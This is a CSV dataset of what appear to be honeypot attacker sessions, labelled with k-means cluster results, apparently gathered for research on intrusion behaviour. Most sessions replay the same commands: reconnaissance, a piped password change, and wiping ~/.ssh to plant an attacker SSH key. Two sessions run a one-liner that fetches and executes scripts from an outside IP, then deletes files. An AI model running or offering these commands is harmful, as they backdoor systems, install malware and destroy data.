session,SeededKmeans_result,Unnamed: 0,duration,command_freq,input
c0a2391322e6,1,11787,20.86737370491028,18,top
c0a2391322e6,1,11788,20.86737370491028,18,uname
c0a2391322e6,1,11789,20.86737370491028,18,uname -a
c0a2391322e6,1,11790,20.86737370491028,18,lscpu | grep Model
c0a2391322e6,1,11791,20.86737370491028,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
d9cc7108f273,1,11792,11.777075290679932,18,cat /proc/cpuinfo | grep name | wc -l
d9cc7108f273,1,11793,11.777075290679932,18,"echo -e ""psh\nRlB5DRpiRy5a\nRlB5DRpiRy5a""|passwd|bash"
d9cc7108f273,1,11794,11.777075290679932,18,Enter new UNIX password: 
d9cc7108f273,1,11795,11.777075290679932,18,Enter new UNIX password:
d9cc7108f273,1,11796,11.777075290679932,18,"echo ""psh\nRlB5DRpiRy5a\nRlB5DRpiRy5a\n""|passwd"
d9cc7108f273,1,11797,11.777075290679932,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
d9cc7108f273,1,11798,11.777075290679932,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
d9cc7108f273,1,11799,11.777075290679932,18,ls -lh $(which ls)
d9cc7108f273,1,11800,11.777075290679932,18,which ls
d9cc7108f273,1,11801,11.777075290679932,18,crontab -l
d9cc7108f273,1,11802,11.777075290679932,18,w
d9cc7108f273,1,11803,11.777075290679932,18,uname -m
d9cc7108f273,1,11804,11.777075290679932,18,cat /proc/cpuinfo | grep model | grep name | wc -l
d9cc7108f273,1,11805,11.777075290679932,18,top
d9cc7108f273,1,11806,11.777075290679932,18,uname
d9cc7108f273,1,11807,11.777075290679932,18,uname -a
d9cc7108f273,1,11809,11.777075290679932,18,lscpu | grep Model
d9cc7108f273,1,11814,11.777075290679932,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
fb33e02b2bd5,1,11808,5.612748384475708,18,cat /proc/cpuinfo | grep name | wc -l
fb33e02b2bd5,1,11810,5.612748384475708,18,"echo -e ""courses\nZE49sbwqU08X\nZE49sbwqU08X""|passwd|bash"
fb33e02b2bd5,1,11811,5.612748384475708,18,Enter new UNIX password: 
fb33e02b2bd5,1,11812,5.612748384475708,18,Enter new UNIX password:
fb33e02b2bd5,1,11813,5.612748384475708,18,"echo ""courses\nZE49sbwqU08X\nZE49sbwqU08X\n""|passwd"
fb33e02b2bd5,1,11815,5.612748384475708,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
fb33e02b2bd5,1,11816,5.612748384475708,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
fb33e02b2bd5,1,11817,5.612748384475708,18,ls -lh $(which ls)
fb33e02b2bd5,1,11818,5.612748384475708,18,which ls
fb33e02b2bd5,1,11819,5.612748384475708,18,crontab -l
fb33e02b2bd5,1,11820,5.612748384475708,18,w
fb33e02b2bd5,1,11821,5.612748384475708,18,uname -m
fb33e02b2bd5,1,11822,5.612748384475708,18,cat /proc/cpuinfo | grep model | grep name | wc -l
fb33e02b2bd5,1,11823,5.612748384475708,18,top
fb33e02b2bd5,1,11824,5.612748384475708,18,uname
fb33e02b2bd5,1,11825,5.612748384475708,18,uname -a
fb33e02b2bd5,1,11826,5.612748384475708,18,lscpu | grep Model
fb33e02b2bd5,1,11827,5.612748384475708,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
757fa237c17f,1,11828,13.851471424102783,18,cat /proc/cpuinfo | grep name | wc -l
757fa237c17f,1,11829,13.851471424102783,18,"echo -e ""nas123\nPU5PJpjpPMhY\nPU5PJpjpPMhY""|passwd|bash"
757fa237c17f,1,11830,13.851471424102783,18,Enter new UNIX password: 
757fa237c17f,1,11831,13.851471424102783,18,Enter new UNIX password:
757fa237c17f,1,11832,13.851471424102783,18,"echo ""nas123\nPU5PJpjpPMhY\nPU5PJpjpPMhY\n""|passwd"
757fa237c17f,1,11833,13.851471424102783,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
757fa237c17f,1,11834,13.851471424102783,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
757fa237c17f,1,11835,13.851471424102783,18,ls -lh $(which ls)
757fa237c17f,1,11836,13.851471424102783,18,which ls
757fa237c17f,1,11837,13.851471424102783,18,crontab -l
757fa237c17f,1,11838,13.851471424102783,18,w
757fa237c17f,1,11839,13.851471424102783,18,uname -m
757fa237c17f,1,11840,13.851471424102783,18,cat /proc/cpuinfo | grep model | grep name | wc -l
757fa237c17f,1,11841,13.851471424102783,18,top
757fa237c17f,1,11842,13.851471424102783,18,uname
757fa237c17f,1,11843,13.851471424102783,18,uname -a
757fa237c17f,1,11844,13.851471424102783,18,lscpu | grep Model
757fa237c17f,1,11845,13.851471424102783,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
e18c2d494230,1,11846,3.027045726776123,18,cat /proc/cpuinfo | grep name | wc -l
e18c2d494230,1,11847,3.027045726776123,18,"echo -e ""redis\nx5Z0jHfQ0SRo\nx5Z0jHfQ0SRo""|passwd|bash"
e18c2d494230,1,11848,3.027045726776123,18,Enter new UNIX password: 
e18c2d494230,1,11849,3.027045726776123,18,Enter new UNIX password:
e18c2d494230,1,11850,3.027045726776123,18,"echo ""redis\nx5Z0jHfQ0SRo\nx5Z0jHfQ0SRo\n""|passwd"
e18c2d494230,1,11851,3.027045726776123,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
e18c2d494230,1,11852,3.027045726776123,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
e18c2d494230,1,11853,3.027045726776123,18,ls -lh $(which ls)
e18c2d494230,1,11854,3.027045726776123,18,which ls
e18c2d494230,1,11855,3.027045726776123,18,crontab -l
e18c2d494230,1,11856,3.027045726776123,18,w
e18c2d494230,1,11857,3.027045726776123,18,uname -m
e18c2d494230,1,11858,3.027045726776123,18,cat /proc/cpuinfo | grep model | grep name | wc -l
e18c2d494230,1,11859,3.027045726776123,18,top
e18c2d494230,1,11860,3.027045726776123,18,uname
e18c2d494230,1,11861,3.027045726776123,18,uname -a
e18c2d494230,1,11862,3.027045726776123,18,lscpu | grep Model
e18c2d494230,1,11863,3.027045726776123,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
c7f506d7130f,1,11864,14.609986543655396,18,cat /proc/cpuinfo | grep name | wc -l
c7f506d7130f,1,11865,14.609986543655396,18,"echo -e ""penny\nhPZnedtl2zGd\nhPZnedtl2zGd""|passwd|bash"
c7f506d7130f,1,11866,14.609986543655396,18,Enter new UNIX password: 
c7f506d7130f,1,11867,14.609986543655396,18,Enter new UNIX password:
c7f506d7130f,1,11868,14.609986543655396,18,"echo ""penny\nhPZnedtl2zGd\nhPZnedtl2zGd\n""|passwd"
c7f506d7130f,1,11869,14.609986543655396,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
c7f506d7130f,1,11870,14.609986543655396,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
c7f506d7130f,1,11871,14.609986543655396,18,ls -lh $(which ls)
c7f506d7130f,1,11872,14.609986543655396,18,which ls
c7f506d7130f,1,11873,14.609986543655396,18,crontab -l
c7f506d7130f,1,11874,14.609986543655396,18,w
c7f506d7130f,1,11875,14.609986543655396,18,uname -m
c7f506d7130f,1,11876,14.609986543655396,18,cat /proc/cpuinfo | grep model | grep name | wc -l
c7f506d7130f,1,11877,14.609986543655396,18,top
c7f506d7130f,1,11878,14.609986543655396,18,uname
c7f506d7130f,1,11879,14.609986543655396,18,uname -a
c7f506d7130f,1,11880,14.609986543655396,18,lscpu | grep Model
c7f506d7130f,1,11881,14.609986543655396,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
8861938574c2,1,11882,181.85169911384585,17,cat /proc/cpuinfo | grep name | wc -l
8861938574c2,1,11883,181.85169911384585,17,"echo -e ""amer\nLNy0OPcXZQaO\nLNy0OPcXZQaO""|passwd|bash"
8861938574c2,1,11884,181.85169911384585,17,Enter new UNIX password: 
8861938574c2,1,11885,181.85169911384585,17,Enter new UNIX password:
8861938574c2,1,11886,181.85169911384585,17,"echo ""amer\nLNy0OPcXZQaO\nLNy0OPcXZQaO\n""|passwd"
8861938574c2,1,11887,181.85169911384585,17,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
8861938574c2,1,11888,181.85169911384585,17,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
8861938574c2,1,11889,181.85169911384585,17,ls -lh $(which ls)
8861938574c2,1,11890,181.85169911384585,17,which ls
8861938574c2,1,11891,181.85169911384585,17,crontab -l
8861938574c2,1,11892,181.85169911384585,17,w
8861938574c2,1,11893,181.85169911384585,17,uname -m
8861938574c2,1,11894,181.85169911384585,17,cat /proc/cpuinfo | grep model | grep name | wc -l
8861938574c2,1,11895,181.85169911384585,17,top
8861938574c2,1,11896,181.85169911384585,17,uname
8861938574c2,1,11897,181.85169911384585,17,uname -a
8861938574c2,1,11898,181.85169911384585,17,lscpu | grep Model
611e68dc5024,2,11899,62.45317268371582,1,cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.90.161.105/onions1337; curl -O http://45.90.161.105/onions1337; chmod 777 onions1337; sh onions1337; tftp 45.90.161.105 -c get bins.sh; chmod 777 onions1337; sh onions1337; tftp -r .sh -g 45.90.161.105; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.90.161.105 .sh .sh; sh .sh; rm -rf sh onions1337 .sh .sh; rm -rf *
1f72bd304787,1,11900,87.76589608192444,18,cat /proc/cpuinfo | grep name | wc -l
1f72bd304787,1,11901,87.76589608192444,18,"echo -e ""th\nf8J26vjxROAL\nf8J26vjxROAL""|passwd|bash"
1f72bd304787,1,11902,87.76589608192444,18,Enter new UNIX password: 
1f72bd304787,1,11903,87.76589608192444,18,Enter new UNIX password:
1f72bd304787,1,11904,87.76589608192444,18,"echo ""th\nf8J26vjxROAL\nf8J26vjxROAL\n""|passwd"
1f72bd304787,1,11905,87.76589608192444,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
1f72bd304787,1,11906,87.76589608192444,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
1f72bd304787,1,11907,87.76589608192444,18,ls -lh $(which ls)
1f72bd304787,1,11908,87.76589608192444,18,which ls
1f72bd304787,1,11909,87.76589608192444,18,crontab -l
1f72bd304787,1,11910,87.76589608192444,18,w
1f72bd304787,1,11911,87.76589608192444,18,uname -m
1f72bd304787,1,11912,87.76589608192444,18,cat /proc/cpuinfo | grep model | grep name | wc -l
1f72bd304787,1,11913,87.76589608192444,18,top
1f72bd304787,1,11914,87.76589608192444,18,uname
1f72bd304787,1,11915,87.76589608192444,18,uname -a
1f72bd304787,1,11916,87.76589608192444,18,lscpu | grep Model
1f72bd304787,1,11917,87.76589608192444,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
af7c9b7477ff,2,11918,81.79785776138306,1,cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.90.161.105/onions1337; curl -O http://45.90.161.105/onions1337; chmod 777 onions1337; sh onions1337; tftp 45.90.161.105 -c get bins.sh; chmod 777 onions1337; sh onions1337; tftp -r .sh -g 45.90.161.105; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.90.161.105 .sh .sh; sh .sh; rm -rf sh onions1337 .sh .sh; rm -rf *
4caed2fa7f75,1,11919,155.5983533859253,18,cat /proc/cpuinfo | grep name | wc -l
4caed2fa7f75,1,11920,155.5983533859253,18,"echo -e ""jet123\nkI5GU8PJbQ8y\nkI5GU8PJbQ8y""|passwd|bash"
4caed2fa7f75,1,11921,155.5983533859253,18,Enter new UNIX password: 
4caed2fa7f75,1,11922,155.5983533859253,18,Enter new UNIX password:
4caed2fa7f75,1,11923,155.5983533859253,18,"echo ""jet123\nkI5GU8PJbQ8y\nkI5GU8PJbQ8y\n""|passwd"
4caed2fa7f75,1,11924,155.5983533859253,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
4caed2fa7f75,1,11925,155.5983533859253,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
4caed2fa7f75,1,11926,155.5983533859253,18,ls -lh $(which ls)
4caed2fa7f75,1,11927,155.5983533859253,18,which ls
4caed2fa7f75,1,11928,155.5983533859253,18,crontab -l
4caed2fa7f75,1,11929,155.5983533859253,18,w
4caed2fa7f75,1,11930,155.5983533859253,18,uname -m
4caed2fa7f75,1,11931,155.5983533859253,18,cat /proc/cpuinfo | grep model | grep name | wc -l
4caed2fa7f75,1,11932,155.5983533859253,18,top
4caed2fa7f75,1,11933,155.5983533859253,18,uname
4caed2fa7f75,1,11934,155.5983533859253,18,uname -a
4caed2fa7f75,1,11935,155.5983533859253,18,lscpu | grep Model
4caed2fa7f75,1,11936,155.5983533859253,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
990bcfe79bc7,1,11937,13.31840705871582,18,cat /proc/cpuinfo | grep name | wc -l
990bcfe79bc7,1,11938,13.31840705871582,18,"echo -e ""raz123\n73Y3UCR5YX1j\n73Y3UCR5YX1j""|passwd|bash"
990bcfe79bc7,1,11939,13.31840705871582,18,Enter new UNIX password: 
990bcfe79bc7,1,11940,13.31840705871582,18,Enter new UNIX password:
990bcfe79bc7,1,11941,13.31840705871582,18,"echo ""raz123\n73Y3UCR5YX1j\n73Y3UCR5YX1j\n""|passwd"
990bcfe79bc7,1,11942,13.31840705871582,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
990bcfe79bc7,1,11943,13.31840705871582,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
990bcfe79bc7,1,11944,13.31840705871582,18,ls -lh $(which ls)
990bcfe79bc7,1,11945,13.31840705871582,18,which ls
990bcfe79bc7,1,11946,13.31840705871582,18,crontab -l
990bcfe79bc7,1,11947,13.31840705871582,18,w
990bcfe79bc7,1,11948,13.31840705871582,18,uname -m
990bcfe79bc7,1,11949,13.31840705871582,18,cat /proc/cpuinfo | grep model | grep name | wc -l
990bcfe79bc7,1,11950,13.31840705871582,18,top
990bcfe79bc7,1,11951,13.31840705871582,18,uname
990bcfe79bc7,1,11952,13.31840705871582,18,uname -a
990bcfe79bc7,1,11953,13.31840705871582,18,lscpu | grep Model
990bcfe79bc7,1,11954,13.31840705871582,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
ecbbb5c25052,1,11955,13.759315013885498,18,cat /proc/cpuinfo | grep name | wc -l
ecbbb5c25052,1,11956,13.759315013885498,18,"echo -e ""123asd\nn5zWmWyo9QUb\nn5zWmWyo9QUb""|passwd|bash"
ecbbb5c25052,1,11957,13.759315013885498,18,Enter new UNIX password: 
ecbbb5c25052,1,11958,13.759315013885498,18,Enter new UNIX password:
ecbbb5c25052,1,11959,13.759315013885498,18,"echo ""123asd\nn5zWmWyo9QUb\nn5zWmWyo9QUb\n""|passwd"
ecbbb5c25052,1,11960,13.759315013885498,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
ecbbb5c25052,1,11961,13.759315013885498,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
ecbbb5c25052,1,11962,13.759315013885498,18,ls -lh $(which ls)
ecbbb5c25052,1,11963,13.759315013885498,18,which ls
ecbbb5c25052,1,11964,13.759315013885498,18,crontab -l
ecbbb5c25052,1,11965,13.759315013885498,18,w
ecbbb5c25052,1,11966,13.759315013885498,18,uname -m
ecbbb5c25052,1,11967,13.759315013885498,18,cat /proc/cpuinfo | grep model | grep name | wc -l
ecbbb5c25052,1,11968,13.759315013885498,18,top
ecbbb5c25052,1,11969,13.759315013885498,18,uname
ecbbb5c25052,1,11970,13.759315013885498,18,uname -a
ecbbb5c25052,1,11971,13.759315013885498,18,lscpu | grep Model
ecbbb5c25052,1,11972,13.759315013885498,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
b2c1879badf5,1,11973,15.85998272895813,18,cat /proc/cpuinfo | grep name | wc -l
b2c1879badf5,1,11974,15.85998272895813,18,"echo -e ""trung\n2cTXg18Hqdfy\n2cTXg18Hqdfy""|passwd|bash"
b2c1879badf5,1,11975,15.85998272895813,18,Enter new UNIX password: 
b2c1879badf5,1,11976,15.85998272895813,18,Enter new UNIX password:
b2c1879badf5,1,11977,15.85998272895813,18,"echo ""trung\n2cTXg18Hqdfy\n2cTXg18Hqdfy\n""|passwd"
b2c1879badf5,1,11978,15.85998272895813,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
b2c1879badf5,1,11979,15.85998272895813,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
b2c1879badf5,1,11980,15.85998272895813,18,ls -lh $(which ls)
b2c1879badf5,1,11981,15.85998272895813,18,which ls
b2c1879badf5,1,11982,15.85998272895813,18,crontab -l
b2c1879badf5,1,11983,15.85998272895813,18,w
b2c1879badf5,1,11984,15.85998272895813,18,uname -m
b2c1879badf5,1,11985,15.85998272895813,18,cat /proc/cpuinfo | grep model | grep name | wc -l
b2c1879badf5,1,11986,15.85998272895813,18,top
b2c1879badf5,1,11987,15.85998272895813,18,uname
b2c1879badf5,1,11988,15.85998272895813,18,uname -a
b2c1879badf5,1,11989,15.85998272895813,18,lscpu | grep Model
b2c1879badf5,1,11990,15.85998272895813,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
6e8f3e2773c8,1,11991,20.369085550308228,18,cat /proc/cpuinfo | grep name | wc -l
6e8f3e2773c8,1,11992,20.369085550308228,18,"echo -e ""123456\n81psWuRLXqFf\n81psWuRLXqFf""|passwd|bash"
6e8f3e2773c8,1,11993,20.369085550308228,18,Enter new UNIX password: 
6e8f3e2773c8,1,11994,20.369085550308228,18,Enter new UNIX password:
6e8f3e2773c8,1,11995,20.369085550308228,18,"echo ""123456\n81psWuRLXqFf\n81psWuRLXqFf\n""|passwd"
6e8f3e2773c8,1,11996,20.369085550308228,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
6e8f3e2773c8,1,11997,20.369085550308228,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
6e8f3e2773c8,1,11998,20.369085550308228,18,ls -lh $(which ls)
6e8f3e2773c8,1,11999,20.369085550308228,18,which ls
